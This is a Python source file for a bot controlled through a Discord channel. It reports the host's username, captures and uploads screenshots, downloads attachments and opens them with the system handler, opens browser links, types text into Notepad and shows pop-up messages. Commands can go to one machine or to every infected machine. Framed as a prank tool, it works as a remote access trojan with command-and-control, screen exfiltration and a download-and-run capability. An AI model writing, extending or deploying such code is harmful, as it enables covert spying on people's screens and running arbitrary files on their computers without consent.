import subprocess
import sys
import os
import time
import webbrowser
import discord
from discord.ext import commands 
import pyautogui
import platform
import tkinter as tk
from tkinter import messagebox
import pygetwindow as gw

#Variables and stuff
strid = ""

script_dir = os.path.dirname(os.path.abspath(__file__))

scrnm = 'Screenshot.png'

scrdir = os.path.join(script_dir, scrnm)

#Debug code
print("START")

#Token and channel id
Token = "insert token here"
chnid = 0 #insert channel id

#Get identifcation for direct commands
try:
    user = os.getlogin()
except OSError:
    # Handle the case where os.getlogin() doesn't work
    user = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
strid = user

#Intents
intents = discord.Intents.all() #To lazy to do each one

bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())

#Command functions
def writefunct(name):
    if name == strid:
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        
        time.sleep(2)
        
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
        else:
            returnvar = "Failed to find Notepad window"
            return returnvar

        pyautogui.write("Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy.", interval=0.05)  #Replace with desired text, this interval best worked for me
        returnvar = f'dirwrite: {strid}'
        return returnvar
    elif name == "all":
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        
        time.sleep(2)
        
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
        else:
            returnvar = "Failed to find Notepad window"
            return returnvar

        pyautogui.write("Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy.", interval=0.05)  #Replace with desired text, this interval best worked for me
        returnvar = f'write: {strid}'
        return returnvar
    else:
        returnvar = ""
        return returnvar
    
def rickfunct(name, url): #self explanitory
    if name == strid:
        webbrowser.open(url)
        return f'Dirricked: {strid}!'
    elif name == "all":
        webbrowser.open(url)
        return f"ricked: {strid}"
    else:
        return ""

def promptfunct(name, text):
    if name == strid:
        root = tk.Tk()
        root.withdraw()  # Hide the root window
    
    
        # Display a message box
        messagebox.showinfo("Important message", f"{text}")

        return f"dirprompt: {strid}; {text}"

    elif name == "all":
        root = tk.Tk()
        root.withdraw()  # Hide the root window
    
    
        # Display a message box
        messagebox.showinfo("Important message", f"{text}")

        return f"prompt: {strid}; {text}"

    else:
        return ""


#Initalize command.  Example: !test

@bot.event #When bot connects to server
async def on_ready():
    print("Running")                                    #Debug
    channel = bot.get_channel(chnid)                    #Get the specifed channel
    await channel.send(f"Operating: {strid}")           #Send message to server

@bot.command(name='stop')#To close specified online bots
async def stop(ctx, *, name: str = None):
    if name == strid:   #Send command to only directed bot
        await ctx.send(f"Shuting down: {strid}")
        sys.exit()
    elif name == "all": #Send command to all online bots
        await ctx.send(f"Shuting down: {strid}")
        sys.exit()
    else:               #Returns invalid in case you actualy want to shut down but miss type
        await ctx.send("invalid shut down")
        print("0")

@bot.command(name='test')#Test if bot can receive
async def test(ctx, *, name: str = None):
    if name == strid:                           #Sends message "dirrecive" with id to verify direct receive function works
        await ctx.send(f'dirrecive: {strid}')
    elif name == "all":                         #Sends message "recive" with id to verify receive all function works
        await ctx.send(f"recived: {strid}")
    else:                                       #Does nothing because target destination is mispelled or not the directed bot
        print("0")

@bot.command(name='screen')
async def screen(ctx, *, name: str = None):
    if name == strid:                   #Send to only specified id
        print("K")
        pyautogui.screenshot(scrdir)#take screenshot

        we=0

        while we < 2:
            we += 1
            await ctx.send(content=f"dirscreen: {strid}", file=discord.File(scrdir)) #send screenshot
        
            try:
                # Delete the file
                we += 1
                os.remove(scrdir)
            except Exception as e:
                print("ohno") 

    elif name == "all":                   #Send to all
        print("K")
        pyautogui.screenshot(scrdir) #take screenshot

        we=0

        while we < 2:
            we += 1
            await ctx.send(content=f"screen:{strid}", file=discord.File(scrdir)) #send screenshot
        
            try:
                # Delete the file
                we += 1
                os.remove(scrdir)
            except Exception as e:
                print("ohno") 

    else:
        print("0")


@bot.command(name='write')#Check function for details
async def write(ctx, *, name: str = None):
    wrtvar = writefunct(name)
    if wrtvar == "":
        print(0)
    else:
        await ctx.send(wrtvar)


@bot.command(name='rick')#Check function for details
async def rick(ctx, *, name: str = None):
    url = 'https://www.youtube.com/watch?v=p7YXXieghto'
    rvar = rickfunct(name, url)
    if rvar == "":
        print(0)
    else:
        await ctx.send(rvar)

@bot.command(name='altrick')#Check function for details
async def altrick(ctx, *, name: str = None):
    url = 'https://youtube.com/clip/Ugkx6oaIXZKt-QhGWyxiwjIUQdK--u3zN-JE?si=FGFWE2OV0m9utxLc'
    rvar = rickfunct(name, url)
    if rvar == "":
        print(0)
    else:
        await ctx.send(rvar)

@bot.command(name='dldimg')
async def dldimg(ctx, *, name: str = None):
    if name == strid:
        # Check if the message contains attachments
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                await ctx.send(f'Successfully downloaded {file_name}')

                if os.path.exists(file_path):
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                # To optionally send the file back to the channel use this :await ctx.send(file=discord.File(file_path))
                
            
                print(file_path)#debug

                if platform.system() == "Windows":  #open using os' image opening application
                    os.startfile(file_path)
                elif platform.system() == "Darwin":
                   subprocess.call(["open", file_path])
                else:
                    subprocess.call(["xdg-open", file_path])

                time.sleep(10)      #wait before delete so image can load even if device is slow

                #Delete the file
                os.remove(file_path)

                time.sleep(5)

                if os.path.exists(file_path): #debug: wait and check if like image is deleted
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                await ctx.send(f"dirdldimg: {strid}")

            except Exception as e:
                await ctx.send(f'Failed to download the file: {e}')
        else:
            await ctx.send('No file attached')

    elif name == "all":
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                await ctx.send(f'Successfully downloaded {file_name}')

                if os.path.exists(file_path):
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                # To optionally send the file back to the channel use this :await ctx.send(file=discord.File(file_path))
                
            
                print(file_path)

                if platform.system() == "Windows": #open using os' image opening application
                    os.startfile(file_path)
                elif platform.system() == "Darwin":
                   subprocess.call(["open", file_path])
                else:
                    subprocess.call(["xdg-open", file_path])

                time.sleep(10) #wait before delete so image can load even if device is slow
                #Delete the file
                os.remove(file_path)

                time.sleep(5)

                if os.path.exists(file_path):#debug: wait and check if like image is deleted
                    print(f'File exists: {file_path}')
                else:
                    print(f'File does not exist: {file_path}')

                await ctx.send(f"dldimg: {strid}")

            except Exception as e:
                await ctx.send(f'Failed to download the file: {e}')
        else:
            await ctx.send('No file attached')

    else:
        print("0")


@bot.command(name='prompt')#Check function for details
async def prompt(ctx, name: str = None, *, text: str = None):
    promptvar = promptfunct(name, text)
    if promptvar == "":
        print(0)
    else:
        await ctx.send(promptvar)

bot.run(Token)
